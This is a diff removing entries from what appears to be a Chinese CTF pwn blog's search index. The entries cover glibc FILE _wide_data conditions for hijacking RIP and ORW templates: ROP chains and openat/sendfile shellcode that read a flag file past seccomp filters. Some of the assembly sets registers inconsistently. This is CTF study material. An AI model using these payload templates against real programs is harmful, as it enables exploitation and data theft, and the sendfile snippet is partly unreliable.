-_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A
-_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18)
-_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
-_wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C
-</code></pre>
-<br>
-
-<p><em>条件绕过</em>   </p>
-<pre><code>直接设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。
-随后当more != 0时会进入__wunderflow。   
-要想调用到_IO_switch_to_wget_mode，需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。
-当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。
-</code></pre>
-<br>
-<br>
-
-<hr>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>IO</tag>
-        <tag>house of</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>orw</title>
-    <url>/2024/08/10/orw%E6%A8%A1%E6%9D%BF/</url>
-    <content><![CDATA[<hr>
-<h1 id="orw-模板"><a href="#orw-模板" class="headerlink" title="orw 模板"></a>orw 模板</h1> <span id="more"></span>        
-
-<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a><em>tips</em></h3><p>liunx64：<br>1、read 0、readv 19<br>2、write 1、writev 20<br>3、open 2、openat 257<br>4、sendfile 40    </p>
-<br>
- 
-<h2 id="orw的原型及参数"><a href="#orw的原型及参数" class="headerlink" title="orw的原型及参数"></a>orw的原型及参数</h2><pre><code>1. read
-原型: ssize_t read(int fd, void *buf, size_t count);
-参数:
-fd：文件描述符。
-buf：指向存储读取数据的缓冲区的指针。
-count：要读取的字节数。      
-
-2. readv
-原型: ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
-参数:
-fd：文件描述符。
-iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
-iovcnt：iovec 结构体的数量。  
-
-3. write
-原型: ssize_t write(int fd, const void *buf, size_t count);
-参数:
-fd：文件描述符。
-buf：指向要写入的数据的缓冲区的指针。
-count：要写入的字节数。
-
-4. writev
-原型: ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
-参数:
-fd：文件描述符。
-iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
-iovcnt：iovec 结构体的数量。
-
-5. open
-原型: int open(const char *pathname, int flags, mode_t mode);
-参数:
-pathname：要打开的文件的路径。
-flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
-mode：文件权限，仅在使用 O_CREAT 标志时需要。
-
-6. openat
-原型: int openat(int dirfd, const char *pathname, int flags, mode_t mode);
-参数:
-dirfd：目录文件描述符，表示相对路径的基准目录（可以是 AT_FDCWD）。
-pathname：要打开的文件的路径。
-flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
-mode：文件权限，仅在使用 O_CREAT 标志时需要。
-
-7. sendfile
-原型: ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
-参数:
-out_fd：目标文件描述符（通常是套接字）。
-in_fd：源文件描述符。
-offset：偏移量的指针，用于指定从源文件中开始的字节位置（如果为 NULL，从当前文件位置开始）。
-count：要发送的字节数。
-</code></pre>
-<h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a><em>模版</em></h3><p>只禁用了execve   </p>
-<pre><code>o=base+libc.sym[&#39;open&#39;]
-r=base+libc.sym[&#39;read&#39;]
-w=base+libc.sym[&#39;write&#39;]
-orw=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
-orw+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(r)
-orw+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(w)
-</code></pre>
-<p>其中的寄存器的呈现形式及赋值视情况而变动。</p>
- <br>
- ### <em>sendfile</em>
- 禁用open、execve、read、write、readv、writev
-
-<pre><code>asm(&#39;&#39;&#39;
-mov rdi,3;                    #openat调用
-mov rdx,0;
-mov r10,0;
-mov rsi,flag;                 #flag地址
-mov rax,257;
-syscall;
-
-mov rdi,0;                    #sendfile调用  
-mov rsi,3;
-mov rdi,1;
-xor rdx,rdx;
-mov r10,0x33;                 #读取大小
-mov rax,40;
-syscall;
-
-
-mov rax,60;                    #exit调用
-xor rdi,rdi;
-syscall;
-&#39;&#39;&#39;
-)
-</code></pre>
-<p>其中指令的表现形式也视具体情况而变动。<br><br><br>比正常情况下少了8字节</p>
-<pre><code>o = libc_base + libc.sym[&#39;open&#39;]
-sendfile = libc_base + libc.sym[&#39;sendfile&#39;]
-orw = p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
-orw+=p64(rdi)+p64(1)+p64(rsi)+p64(3)+p64(rdx)+p64(0)+p64(r10)+p64(r/w_size)+p64(sendfile)
-</code></pre>
-<hr>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>orw</tag>
       </tags>
   </entry>
 </search>
